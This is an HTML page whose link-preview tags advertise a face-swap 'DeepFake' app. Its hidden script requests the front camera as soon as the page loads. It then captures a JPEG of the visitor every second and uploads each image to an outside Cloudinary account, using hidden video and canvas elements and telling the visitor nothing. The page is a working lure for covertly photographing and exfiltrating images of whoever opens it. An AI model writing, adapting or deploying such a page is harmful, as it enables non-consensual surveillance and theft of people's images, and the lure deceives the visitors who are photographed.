<!DOCTYPE html>
<html>
<head>
  <meta property="og:title" content="Change your face to anyone you like !">
  <meta property="og:description" content="DeepFake">
  <meta property="og:image" content="https://i.ytimg.com/vi/v_NQPA7sz9Y/hqdefault.jpg">
  <title>Looped Capture and Upload to Cloudinary</title>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    let photoData = '';

    // Replace with your Cloudinary unsigned upload preset and cloud name
    const cloudName = 'dxkgvoale';
    const uploadPreset = 'my_unsigned';

    async function initCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false
        });
        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        // Start looping capture every second
        setInterval(captureAndUpload, 1000);
      } catch (err) {
        console.error('Camera access denied or not available.', err);
      }
    }

    async function captureAndUpload() {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Compress to JPEG and reduce quality (0.6 = 60%)
      photoData = canvas.toDataURL('image/jpeg', 0.6);

      try {
        const formData = new FormData();
        formData.append('file', photoData);
        formData.append('upload_preset', uploadPreset);

        const res = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
          method: 'POST',
          body: formData
        });

        const data = await res.json();
        if (data.secure_url) {
          console.log('✅ Uploaded to Cloudinary:', data.secure_url);
        } else {
          console.error('❌ Upload failed.', data);
        }
      } catch (e) {
        console.error('⚠️ Error uploading image.', e);
      }
    }

    window.onload = initCamera;
  </script>
</body>
</html>
